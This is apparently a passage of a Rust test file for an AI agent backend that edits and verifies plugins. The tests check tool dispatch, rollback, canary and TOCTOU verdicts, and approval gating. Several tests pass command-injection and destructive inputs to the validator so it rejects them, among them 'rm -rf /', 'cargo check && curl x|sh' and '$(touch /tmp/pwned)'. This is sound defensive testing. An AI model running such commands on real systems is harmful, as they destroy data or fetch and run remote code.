//! Backend-level tests for the plugin-iteration agent backend.
//!
//! Ported out of the kernel's unit tests so the backend can move into this
//! crate; they exercise the same arms through the public API.

#[ctor::ctor]
fn _install_agent_loop() {
    let _ = cordis_agent::install();
    support::install_cargo_builder();
    let _ = cordis_runtime::iteration_api::install_iteration_runner(Box::new(
        cordis_agent::iteration::CargoIterationRunner,
    ));
}

mod support;

use cordis_plugin_sdk::{AbiFingerprint, NodeDoc, NodeType, PluginDocs};
use std::fs;
use std::path::PathBuf;
use std::sync::atomic::Ordering::SeqCst;
use std::sync::Arc;

use cordis_agent::iteration::backend::PluginIterationAgentBackend;
use cordis_runtime::agent_api::AgentBackend;
use cordis_runtime::core::error::RuntimeError;
use cordis_runtime::host::ScaffoldChildPluginArgs;
use cordis_runtime::host::{
    plugin_iteration_journal_path, PluginIterationAgentState, PluginIterationContextPaths,
    PreparedPluginIteration, RuntimeHost, PLUGIN_AGENT_TOOL_RECORD_ITERATION_SUMMARY,
    PLUGIN_AGENT_TOOL_REPLACE_FILES_EXACT, TEST_ITERATION_ENOSPC_INJECTION,
    TEST_ITERATION_PANIC_INJECTION,
};
use cordis_runtime::kernel::plugin_iteration::KernelPluginIterationRequest;
use cordis_runtime::kernel::plugin_iteration::{
    CanaryVerdict, KernelPluginIssueSource, PluginEditOpKind, PluginEditOperation,
    PluginIterationFinalVerdict, VerifierVerdict,
};
use cordis_runtime::kernel::verifier::VerificationProfile;
use serde_json::{json, Value};
use tempfile::TempDir;

/// A backend bound to a hermetic empty-fixture host.
fn with_backend<R>(
    host: &RuntimeHost,
    f: impl FnOnce(&mut PluginIterationAgentBackend<'_>) -> R,
) -> R {
    let prepared = prepared_for("mini", &["mini"]);
    let context_paths = PluginIterationContextPaths {
        focus_paths: Vec::new(),
        all_paths: Vec::new(),
    };
    let mut state = PluginIterationAgentState::new(prepared, context_paths, host.fixtures_root());
    let mut backend = PluginIterationAgentBackend {
        host,
        state: &mut state,
    };
    f(&mut backend)
}

/// Seed a writable `plugins/mini/src/<name>` file inside the host's tree.
fn seed_writable_source(host: &RuntimeHost, name: &str, body: &str) -> String {
    let rel = format!("plugins/mini/src/{name}");
    let abs = host.fixtures_root().join(&rel);
    fs::create_dir_all(abs.parent().expect("parent")).expect("mkdir src");
    fs::write(&abs, body).expect("seed source");
    rel
}

/// The message an `InvalidArgument` carries, for byte-exact assertions.
fn invalid_argument_message(err: &RuntimeError) -> String {
    match err {
        RuntimeError::InvalidArgument { message } => message.clone(),
        other => panic!("expected InvalidArgument, got {other:?}"),
    }
}

fn iteration_request() -> KernelPluginIterationRequest {
    // Root mode (empty targets) so `begin_plugin_iteration` succeeds even
    // with zero registered plugins.
    KernelPluginIterationRequest {
        issue_id: None,
        target_plugin_paths: Vec::new(),
        instruction: Some("seam panic injection".to_string()),
        edit_plan: None,
        manual_approved: false,
        tests_command: None,
        safety_command: None,
        verify_profile: None,
        quality_score: None,
    }
}

fn empty_plan_request() -> KernelPluginIterationRequest {
    use cordis_runtime::kernel::plugin_iteration::PluginEditPlan;
    KernelPluginIterationRequest {
        issue_id: None,
        target_plugin_paths: Vec::new(),
        instruction: Some("enospc injection".to_string()),
        edit_plan: Some(PluginEditPlan {
            issue_id: "enospc-issue".to_string(),
            patch_id: "enospc-patch".to_string(),
            summary: "no-op plan".to_string(),
            operations: Vec::new(),
        }),
        manual_approved: true,
        tests_command: None,
        safety_command: None,
        verify_profile: None,
        quality_score: None,
    }
}

fn setup_verify_node_json_fixture() -> (TempDir, PathBuf) {
    let temp = TempDir::new().expect("tempdir");
    let fixtures = temp.path().join("fixtures");
    let artifacts = fixtures.join("artifacts");
    fs::create_dir_all(&artifacts).expect("artifacts dir");

    // A tiny echo executable: a shell script that prints a fixed JSON.
    let echo = artifacts.join("svc_verify.sh");
    fs::write(&echo, "#!/bin/sh\ncat >/dev/null\necho '{\"ok\":true}'\n")
        .expect("write echo script");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&echo).expect("meta").permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&echo, perms).expect("chmod echo");
    }

    let abi = AbiFingerprint::current_build("crate_svc_v1", "api_v2");
    let node = NodeDoc {
        id: "svc_verify".to_string(),
        summary: "declared verifier node".to_string(),
        input_schema: json!({ "type": "object" }),
        output_schema: json!({ "type": "object" }),
        side_effects: Vec::new(),
        failure_modes: Vec::new(),
        node_type: NodeType::Task,
        agent_accessible: false,
    };
    let docs = PluginDocs {
        plugin_id: "svc".to_string(),
        plugin_path: "svc".to_string(),
        plugin_version: "0.1.0".to_string(),
        abi_version: 2,
        command_name: Some("Svc".to_string()),
        nodes: vec![node],
        system_hint: None,
    };
    let execution = json!({ "kind": "process", "command": "svc_verify.sh", "args": [] });
    let artifact_value = json!({
        "plugin_path": "svc",
        "abi_fingerprint": abi,
        "docs": docs,
        "exports": [],
        "execution": execution,
    });
    let artifact_path = artifacts.join("svc.json");
    fs::write(
        &artifact_path,
        serde_json::to_vec_pretty(&artifact_value).expect("serialize artifact"),
    )
    .expect("write artifact");
    let sha256 =
        cordis_runtime::plugin::artifact::sha256_file(&artifact_path).expect("hash svc artifact");
    let index_value = json!({
        "schema_version": 2,
        "generated_at": "2026-07-25T00:00:00Z",
        "topo_order": ["svc"],
        "entries": [{
            "plugin_path": "svc",
            "version": "0.1.0",
            "abi_fingerprint": abi,
            "artifact_path": "svc.json",
            "sha256": sha256,
            "built_at": "0",
            "parent": null,
            "required": true,
            "grants_from_parent": [],
            "docs": docs,
            "exports": [],
            "execution": execution,
            "artifact_kind": "json",
            "build_fingerprint": "bf",
            "input_probe": { "files": [] },
            "local_path_deps": []
        }]
    });
    fs::write(
        artifacts.join("index.json"),
        serde_json::to_vec_pretty(&index_value).expect("serialize index"),
    )
    .expect("write index");
    (temp, fixtures)
}

fn wedge_journal_as_dir(host: &RuntimeHost) {
    let journal = cordis_runtime::host::plugin_iteration_journal_path(host.snapshot_root());
    fs::create_dir_all(&journal).expect("create journal-as-dir");
    fs::write(journal.join("blocker.txt"), b"x").expect("nonempty dir");
}

struct TestAgentRun;
impl TestAgentRun {
    fn with_requires_approval(flag: bool) -> cordis_runtime::host::PluginIterationAgentRun {
        cordis_runtime::host::PluginIterationAgentRun {
            llm_driven: true,
            session_id: None,
            tool_summary: None,
            transcript_excerpt: Vec::new(),
            recorded_summary: Some("test".to_string()),
            requires_approval: flag,
            changed_paths: Vec::new(),
            rollback: cordis_runtime::kernel::plugin_iteration::PluginEditRollback::empty(
                std::path::Path::new("."),
            ),
            derived_edit_plan: cordis_runtime::kernel::plugin_iteration::PluginEditPlan {
                issue_id: "issue".to_string(),
                patch_id: "patch".to_string(),
                summary: "test".to_string(),
                operations: Vec::new(),
            },
        }
    }
}

fn setup_empty_fixture() -> (TempDir, std::path::PathBuf) {
    let temp = TempDir::new().expect("tempdir");
    let fixtures = temp.path().join("fixtures");
    let artifacts = fixtures.join("artifacts");
    fs::create_dir_all(&artifacts).expect("artifacts");
    fs::write(
        artifacts.join("index.json"),
        r#"{"schema_version":2,"generated_at":"2026-07-25T00:00:00Z","topo_order":[],"entries":[]}"#,
    )
    .expect("index");
    (temp, fixtures)
}

fn empty_host() -> (TempDir, RuntimeHost) {
    let (temp, fixtures) = setup_empty_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("boot on empty index");
    (temp, host)
}

fn prepared_for(root: &str, targets: &[&str]) -> PreparedPluginIteration {
    let target_plugin_paths: Vec<String> = targets.iter().map(|s| (*s).to_string()).collect();
    let allowed_plugin_roots: std::collections::BTreeMap<String, String> = target_plugin_paths
        .iter()
        .map(|p| (p.clone(), format!("plugins/{p}")))
        .collect();
    PreparedPluginIteration {
        iteration_id: "iter-seam-3500".to_string(),
        issue_id: "issue-seam-3500".to_string(),
        root_plugin_path: root.to_string(),
        target_plugin_paths,
        source: None,
        summary: "seam iteration".to_string(),
        manual_approved: false,
        tests_command: None,
        safety_command: None,
        verify_profile: cordis_runtime::kernel::verifier::VerificationProfile::RustWorkspace,
        quality_score: None,
        instruction: None,
        allowed_plugin_roots,
        edit_plan: None,
    }
}

#[test]

fn backend_replace_files_exact_success_arm_applies_batch() {
    let (_temp, host) = empty_host();
    let rel = seed_writable_source(&host, "batch_target.rs", "OLD contents\n");
    with_backend(&host, |backend| {
        let out = AgentBackend::execute_tool(
            backend,
            PLUGIN_AGENT_TOOL_REPLACE_FILES_EXACT,
            json!({
                "edits": [{
                    "path": rel,
                    "expected_old_string": "OLD contents\n",
                    "new_content": "NEW contents\n"
                }]
            }),
        )
        .expect("non-empty replace_files_exact batch succeeds");
        // apply_operations returns a JSON summary; the operation is recorded.
        assert!(out.is_object() || out.is_array() || out.is_null() || out.is_string());
        assert_eq!(backend.state.operations.len(), 1);
    });
    // The file on disk now carries the new content.
    assert_eq!(
        fs::read_to_string(host.fixtures_root().join(&rel)).expect("read edited"),
        "NEW contents\n"
    );
}

#[test]

fn backend_run_plugin_check_builds_single_plugin_default_command() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // No explicit command + plugin_path "/mini" → the default builder
        // produces `cargo check ... -p mini`. We point it at a bogus
        // manifest so the command runs quickly and fails (exit != 0), but
        // the default-command construction (the target line) still runs.
        let out = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "plugin_path": "/mini" }),
        )
        .expect("run_plugin_check returns Ok even when cargo exits nonzero");
        assert_eq!(out.get("stage").and_then(Value::as_str), Some("check"));
        let cmd = out.get("command").and_then(Value::as_str).expect("command");
        assert!(cmd.contains("cargo check"));
        assert!(cmd.contains("-p mini"), "single-plugin default: {cmd}");
    });
}

#[test]

fn backend_run_plugin_check_builds_whole_workspace_default_command() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // plugin_path "/" → whole-workspace default (no `-p`).
        let out =
            AgentBackend::execute_tool(backend, "run_plugin_check", json!({ "plugin_path": "/" }))
                .expect("run_plugin_check Ok");
        let cmd = out.get("command").and_then(Value::as_str).expect("command");
        assert!(cmd.contains("cargo check"));
        assert!(!cmd.contains("-p "), "whole-workspace default: {cmd}");
    });
}

#[test]

fn backend_phase_reflects_state_progression() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // No operations yet → exploration.
        assert_eq!(backend.phase(), "exploration");
        backend.state.operations.push(PluginEditOperation {
            path: "plugins/mini/src/lib.rs".to_string(),
            kind: PluginEditOpKind::ReplaceExact,
            expected_old_string: Some("a".to_string()),
            expected_sha256: None,
            new_content: Some("b".to_string()),
            pointer: None,
            dotted_key: None,
            value: None,
        });
        // Has ops, no verification attempts → editing.
        assert_eq!(backend.phase(), "editing");
        backend.state.verification_attempts = 1;
        // Attempts but no successes → verification_retry.
        assert_eq!(backend.phase(), "verification_retry");
        backend.state.verification_successes = 1;
        // Successes → verification.
        assert_eq!(backend.phase(), "verification");
        backend.state.recorded_summary = Some("done".to_string());
        // Recorded summary → finalized (highest priority).
        assert_eq!(backend.phase(), "finalized");
    });
}

#[test]

fn backend_tool_scope_label_embeds_phase() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        assert_eq!(backend.tool_scope_label(), "plugin_iteration:exploration");
    });
}

#[test]

fn backend_host_accessor_returns_bound_host() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // The AgentBackend::host accessor returns the same fixtures root.
        assert_eq!(
            AgentBackend::host(backend).fixtures_root(),
            host.fixtures_root()
        );
    });
}

#[test]

fn backend_execute_tool_empty_replace_batch_errors() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let out = AgentBackend::execute_tool(
            backend,
            PLUGIN_AGENT_TOOL_REPLACE_FILES_EXACT,
            json!({ "edits": [] }),
        );
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "replace_files_exact requires at least one edit"
        ));
    });
}

#[test]

fn backend_execute_tool_unsupported_name_errors() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let out = AgentBackend::execute_tool(backend, "no_such_tool", json!({}));
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "unsupported plugin iteration tool: no_such_tool"
        ));
    });
}

#[test]

fn backend_record_iteration_summary_requires_edits_and_verification() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // No operations + no verification successes → guard error.
        let out = AgentBackend::execute_tool(
            backend,
            PLUGIN_AGENT_TOOL_RECORD_ITERATION_SUMMARY,
            json!({ "summary": "x" }),
        );
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "record_iteration_summary requires at least one edit and one successful verification step"
        ));
    });
}

#[test]

fn backend_scaffold_child_plugin_rejects_parent_outside_subtree() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let args = ScaffoldChildPluginArgs {
            parent_plugin_path: "not-a-target".to_string(),
            child_name: "kid".to_string(),
            template_plugin_path: None,
            node_id: None,
            summary: None,
        };
        let out = backend.scaffold_child_plugin(args);
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "parent plugin path not-a-target is outside the selected subtree"
        ));
    });
}

#[test]

fn backend_run_checked_command_reports_nonzero_exit_without_success_bump() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let before = backend.state.verification_successes;
        // A valid `cargo check` argv against a manifest that does not
        // exist in the empty fixture: spawns cargo, fails fast, exit != 0.
        let out = backend
            .run_checked_command(
                "check",
                "cargo check --manifest-path plugins/Cargo.toml".to_string(),
            )
            .expect("run_checked_command returns Ok even on nonzero exit");
        assert_eq!(out.get("success").and_then(Value::as_bool), Some(false));
        assert_eq!(out.get("stage").and_then(Value::as_str), Some("check"));
        // A failing command increments attempts but not successes.
        assert_eq!(backend.state.verification_attempts, 1);
        assert_eq!(backend.state.verification_successes, before);
    });
}

#[test]

fn backend_run_checked_command_success_bumps_counter() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // `cargo test --help` exits 0 without touching the workspace.
        let out = backend
            .run_checked_command("test", "cargo test --help".to_string())
            .expect("cargo test --help exits 0");
        assert_eq!(out.get("success").and_then(Value::as_bool), Some(true));
        assert_eq!(backend.state.verification_successes, 1);
    });
}

#[test]

fn backend_run_checked_command_rejects_non_cargo_argv_and_metacharacters() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let before = backend.state.verification_attempts;
        // Not `cargo` at all → structure mismatch.
        let err = backend
            .run_checked_command("check", "rm -rf /".to_string())
            .expect_err("a non-cargo argv must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification tool only allows commands starting with `cargo check`, got `rm -rf /`"
        );
        // Valid `cargo check` argv but with a shell-operator tail: the
        // old `bash -lc` dispatch would have executed the `&&` part.
        let err = backend
            .run_checked_command("check", "cargo check && curl x|sh".to_string())
            .expect_err("shell metacharacters must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification command contains shell metacharacter `&&`"
        );
        // A cross-tool op never matches the stage's required op.
        let err = backend
            .run_checked_command("check", "cargo test --lib".to_string())
            .expect_err("cross-tool op must be rejected");
        assert_eq!(
                invalid_argument_message(&err),
                "verification tool only allows commands starting with `cargo check`, got `cargo test --lib`"
            );
        // Rejections still count as verification attempts, like a spawn
        // that fails, but never as successes.
        assert_eq!(backend.state.verification_attempts, before + 3);
        assert_eq!(backend.state.verification_successes, 0);
    });
}

#[test]

fn backend_run_plugin_check_rejects_metachar_command_injection() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // `cargo check` prefix plus a shell-operator tail: the old prefix
        // whitelist let this through to `bash -lc`.
        let err = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "command": "cargo check && curl x|sh" }),
        )
        .expect_err("shell metacharacters must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification command contains shell metacharacter `&&`"
        );
        // A semicolon tail also dies in the argv gate.
        let err = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "command": "cargo check ;ls" }),
        )
        .expect_err("a semicolon tail must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification command contains shell metacharacter `;ls`"
        );
    });
}

#[test]

fn backend_run_plugin_check_rejects_plugin_path_injection() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // plugin_path is appended as its own argv element, so anything
        // that would have been shell syntax in the old
        // `format!("… -p {pp}")` default command is rejected up front.
        for bad in ["/x; rm -rf /", "$(touch /tmp/pwned)", "../evil", "a/../b"] {
            let err = AgentBackend::execute_tool(
                backend,
                "run_plugin_check",
                json!({ "plugin_path": bad }),
            )
            .expect_err("an unsafe plugin_path must be rejected");
            assert_eq!(
                invalid_argument_message(&err),
                format!("plugin path {bad} is not a valid cargo package selector")
            );
        }
    });
}

#[test]

fn backend_run_plugin_check_accepts_bare_check_alias() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // The bare `check` alias maps to the validated default argv with
        // the plugin path appended as its own element.
        let out = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "plugin_path": "/mini", "command": "check" }),
        )
        .expect("bare check alias should run the default command");
        let cmd = out.get("command").and_then(Value::as_str).expect("command");
        assert_eq!(
            cmd,
            "cargo check --quiet --manifest-path plugins/Cargo.toml -p mini"
        );
    });
}

#[test]

fn backend_apply_operations_second_op_failure_enriches_error() {
    let (_temp, host) = empty_host();
    // First op targets a real writable file (applies), second op targets a
    // path OUTSIDE the plugin subtree → policy blocks it, and the partial
    // batch rolls back the first op. The returned error is the enriched
    // second-op failure.
    let good = seed_writable_source(&host, "first_ok.rs", "before\n");
    with_backend(&host, |backend| {
        let ops = vec![
            PluginEditOperation {
                path: good.clone(),
                kind: PluginEditOpKind::ReplaceExact,
                expected_old_string: Some("before\n".to_string()),
                expected_sha256: None,
                new_content: Some("after\n".to_string()),
                pointer: None,
                dotted_key: None,
                value: None,
            },
            PluginEditOperation {
                // Outside plugins/mini subtree → policy rejects.
                path: "plugins/other/src/x.rs".to_string(),
                kind: PluginEditOpKind::CreateFile,
                expected_old_string: Some(String::new()),
                expected_sha256: None,
                new_content: Some("nope".to_string()),
                pointer: None,
                dotted_key: None,
                value: None,
            },
        ];
        let out = backend.apply_operations("batch", ops);
        assert!(out.is_err(), "second-op policy block must fail the batch");
    });
    // The first op was rolled back to its original bytes.
    assert_eq!(
        fs::read_to_string(host.fixtures_root().join(&good)).expect("read"),
        "before\n",
        "partial-batch rollback must restore the first op"
    );
}

// ── pipeline-level tests (moved from the kernel) ──────────────────

#[test]

fn run_plugin_canary_returns_partial_without_evidence() {
    let (_temp, host) = empty_host();
    let state = cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    let report =
        cordis_agent::iteration::driver::run_plugin_canary(&host, &state).expect("canary runs");
    assert_eq!(report.verdict, CanaryVerdict::Partial);
    assert_eq!(report.mode, "no_canary_evidence");
    assert!(report.plugin_path.is_none());
}

#[test]

fn run_plugin_canary_skips_samples_for_other_plugins() {
    let (_temp, host) = empty_host();
    // Seed a sample for a plugin NOT in the target set → the `continue`
    // arm skips it, and with no candidate we fall through to Partial.
    let _ = host.recent_invocation_samples();
    let state = cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    let report =
        cordis_agent::iteration::driver::run_plugin_canary(&host, &state).expect("canary runs");
    assert_eq!(report.verdict, CanaryVerdict::Partial);
    assert_eq!(report.mode, "no_canary_evidence");
}

#[test]

fn finalize_stage_error_short_circuits_to_rolled_back() {
    let (_temp, host) = empty_host();
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.stage_error = Some("rebuild blew up".to_string());
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("finalize returns RolledBack for a stage error");
    assert_eq!(verdict, PluginIterationFinalVerdict::RolledBack);
    assert_eq!(
        state.blocked_reason.as_deref(),
        Some("rebuild blew up"),
        "no candidate + clean restore → base message verbatim"
    );
}

#[test]

fn finalize_verifier_fail_rolls_back_without_candidate() {
    let (_temp, host) = empty_host();
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.verifier_verdict = Some(VerifierVerdict::Fail);
    // A concrete Fail canary (not the Partial default) so the `else`
    // rollback arm — not the Partial-canary Blocked arm — is selected.
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Fail,
        mode: "recent_successful_invocation_replay".to_string(),
        plugin_path: Some("mini".to_string()),
        node_id: Some("mini_echo".to_string()),
        payload: Some(json!({})),
        expected_response: Some(json!({ "ok": true })),
        actual_response: Some(json!({ "ok": false })),
        message: "diverged".to_string(),
    });
    // No candidate staged → the `else` rollback arm runs (candidate cleanup
    // is a no-op) and the workspace restore succeeds on the empty fixture.
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("finalize returns RolledBack for a failed verifier");
    assert_eq!(verdict, PluginIterationFinalVerdict::RolledBack);
}

#[test]

fn finalize_partial_canary_does_not_block_an_agent_change() {
    let (_temp, host) = empty_host();
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.agent = Some(TestAgentRun::with_requires_approval(false));
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Partial,
        mode: "no_canary_evidence".to_string(),
        plugin_path: None,
        node_id: None,
        payload: None,
        expected_response: None,
        actual_response: None,
        message: "no evidence".to_string(),
    });
    // No candidate staged in this hermetic host, so promotion reports the
    // missing candidate instead of Blocked — the point is that the canary
    // no longer diverts the decision to Blocked.
    let err = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect_err("no candidate staged");
    assert!(
        matches!(err, RuntimeError::CandidateSnapshotMissing),
        "got: {err:?}"
    );
}

#[test]

fn finalize_partial_canary_blocks_a_blind_change() {
    let (_temp, host) = empty_host();
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Partial,
        mode: "no_canary_evidence".to_string(),
        plugin_path: None,
        node_id: None,
        payload: None,
        expected_response: None,
        actual_response: None,
        message: "no evidence".to_string(),
    });
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("blocked is not an error");
    assert_eq!(verdict, PluginIterationFinalVerdict::Blocked);
    assert!(state
        .blocked_reason
        .as_deref()
        .is_some_and(|reason| reason.contains("no canary evidence")));
}

#[test]

fn finalize_blocks_a_change_that_edits_an_existing_test() {
    let (_temp, host) = empty_host();
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.agent = Some(TestAgentRun::with_requires_approval(true));
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("blocked, not rolled back");
    assert_eq!(verdict, PluginIterationFinalVerdict::Blocked);
    let reason = state.blocked_reason.unwrap_or_default();
    assert!(reason.contains("existing test"), "reason: {reason}");
    assert!(reason.contains("approval"), "reason: {reason}");
}

#[test]

fn run_plugin_canary_uses_declared_verifier_node_from_candidate() {
    let (_temp, fixtures) = setup_verify_node_json_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("boot on svc fixture");
    // Stage the current tree as a candidate (no source change needed): the
    // candidate registry then carries the `svc` plugin with the verify node.
    host.reload_candidate().expect("stage candidate");
    assert!(host.candidate_snapshot().is_some());

    let state = cordis_runtime::host::PluginIterationRunState::new(prepared_for("svc", &["svc"]));
    let report = cordis_agent::iteration::driver::run_plugin_canary(&host, &state)
        .expect("canary invokes the declared verify node");
    assert_eq!(report.verdict, CanaryVerdict::Pass);
    assert_eq!(report.mode, "declared_plugin_verifier_node");
    assert_eq!(report.node_id.as_deref(), Some("svc_verify"));
    let _ = Arc::strong_count(&host.candidate_snapshot().expect("candidate live"));
}

#[test]

fn run_plugin_canary_replay_divergence_yields_fail() {
    let (_temp, fixtures) = setup_verify_node_json_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("boot on svc fixture");
    host.reload_candidate().expect("stage candidate");
    // Seed a replay sample for svc/svc_verify whose recorded response does
    // NOT match what the candidate echoes ({"ok":true}) → divergence Fail.
    host.record_invocation_sample("svc", "svc_verify", "{}", "{\"ok\":false}");
    let state = cordis_runtime::host::PluginIterationRunState::new(prepared_for("svc", &["svc"]));
    let report = cordis_agent::iteration::driver::run_plugin_canary(&host, &state)
        .expect("canary replay runs");
    assert_eq!(report.verdict, CanaryVerdict::Fail);
    assert_eq!(report.mode, "recent_successful_invocation_replay");
    assert!(report
        .message
        .contains("candidate replay response diverged from current response"));
}

#[test]

fn finalize_promote_failure_pass_pass_arm_returns_err_and_records_reason() {
    let (_temp, host) = empty_host();
    host.reload_candidate().expect("stage candidate");
    wedge_journal_as_dir(&host);
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Pass,
        mode: "recent_successful_invocation_replay".to_string(),
        plugin_path: Some("mini".to_string()),
        node_id: Some("mini_echo".to_string()),
        payload: Some(json!({})),
        expected_response: Some(json!({ "ok": true })),
        actual_response: Some(json!({ "ok": true })),
        message: "match".to_string(),
    });
    let out = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state);
    assert!(out.is_err(), "promote failure must propagate as Err");
    let reason = state.blocked_reason.expect("blocked reason recorded");
    assert!(
        reason.starts_with("promote failed: "),
        "unexpected reason: {reason}"
    );
}

#[test]

fn finalize_manual_approval_promotes_a_test_editing_change() {
    let (_temp, host) = empty_host();
    host.reload_candidate().expect("stage candidate");
    let mut prepared = prepared_for("mini", &["mini"]);
    prepared.manual_approved = true;
    let mut state = cordis_runtime::host::PluginIterationRunState::new(prepared);
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.agent = Some(TestAgentRun::with_requires_approval(true));
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("manual approval promotes");
    assert_eq!(verdict, PluginIterationFinalVerdict::Promoted);
}

#[test]

fn finalize_toctou_drift_downgrades_pass_to_rolled_back() {
    let (_temp, host) = empty_host();
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Pass,
        mode: "recent_successful_invocation_replay".to_string(),
        plugin_path: Some("mini".to_string()),
        node_id: Some("mini_echo".to_string()),
        payload: Some(json!({})),
        expected_response: Some(json!({ "ok": true })),
        actual_response: Some(json!({ "ok": true })),
        message: "match".to_string(),
    });
    // A verification report whose recorded source-tree hash cannot match the
    // real re-hash of the empty fixture → detect_plugin_source_drift trips,
    // downgrading the effective verdict to Fail → RolledBack.
    state.verification = Some(cordis_runtime::kernel::verifier::VerificationReport {
        plan: cordis_runtime::kernel::verifier::VerificationPlan {
            profile: VerificationProfile::Default,
            static_check_command: None,
            tests_command: None,
            safety_command: None,
        },
        stages: Vec::new(),
        input: cordis_runtime::kernel::evaluator::VerificationInput {
            tests_passed: true,
            safety_checks_passed: true,
            quality_score: 100,
        },
        tests: None,
        safety: None,
        source_tree_hash: Some("stale-hash-that-will-not-match".to_string()),
        hash_error: None,
    });
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
        .expect("TOCTOU drift rolls back cleanly (no candidate staged)");
    assert_eq!(verdict, PluginIterationFinalVerdict::RolledBack);
    assert!(state
        .blocked_reason
        .as_deref()
        .expect("drift reason")
        .contains("source tree mutated between verify and promote"));
    // The kernel recorded a VerifierFailure TOCTOU issue.
    let issues = host.kernel().plugin_issues();
    assert!(issues.iter().any(|i| {
        i.source == KernelPluginIssueSource::VerifierFailure
            && i.summary.contains("TOCTOU guard tripped")
    }));
}

#[test]

fn finalize_baseline_hash_failure_downgrades_pass_to_rolled_back() {
    // A Pass verdict whose verification report carries a baseline-hash
    // failure (unreadable entry, dangling symlink, permissions) must NOT
    // be promotable: with no recorded hash there is no way to prove the
    // tree did not change, so it is downgraded exactly like a re-hash
    // failure before promote.
    let (_temp, host) = empty_host();
    let mut state =
        cordis_runtime::host::PluginIterationRunState::new(prepared_for("mini", &["mini"]));
    state.verifier_verdict = Some(VerifierVerdict::Pass);
    state.canary = Some(cordis_runtime::kernel::plugin_iteration::CanaryReport {
        verdict: CanaryVerdict::Pass,
        mode: "recent_successful_invocation_replay".to_string(),
        plugin_path: Some("mini".to_string()),
        node_id: Some("mini_echo".to_string()),
        payload: Some(json!({})),
        expected_response: Some(json!({ "ok": true })),
        actual_response: Some(json!({ "ok": true })),
        message: "match".to_string(),
    });
    state.verification = Some(cordis_runtime::kernel::verifier::VerificationReport {
        plan: cordis_runtime::kernel::verifier::VerificationPlan {
            profile: VerificationProfile::Default,
            static_check_command: None,
            tests_command: None,
            safety_command: None,
        },
        stages: Vec::new(),
        input: cordis_runtime::kernel::evaluator::VerificationInput {
            tests_passed: true,
            safety_checks_passed: true,
            quality_score: 100,
        },
        tests: None,
        safety: None,
        source_tree_hash: None,
        hash_error: Some("unable to read plugins/mini/src/lib.rs".to_string()),
    });
    let verdict = cordis_agent::iteration::driver::finalize_plugin_iteration(&host, &mut state)
